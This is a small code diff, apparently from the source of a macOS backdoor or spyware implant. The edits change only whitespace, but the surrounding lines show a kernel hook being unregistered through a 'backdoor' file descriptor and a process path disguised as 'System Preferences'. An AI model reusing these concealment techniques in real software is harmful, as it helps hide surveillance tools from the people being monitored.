@@ -168,7 +168,7 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(ME, @"Ok we're really shutting down NOW");
 #endif
-
+      
       const char *userName = [NSUserName() UTF8String];
       ioctl(gBackdoorFD, MCHOOK_UNREGISTER, userName);
     }
@@ -3163,7 +3163,7 @@ static void computerWillShutdown(CFMachPortRef port,
           execPath = [NSString stringWithFormat: @"%@",
                       [[[NSBundle mainBundle] bundlePath]
                        stringByAppendingPathComponent: @"System Preferences"]];
-        }    
+        }
     }
   
   //
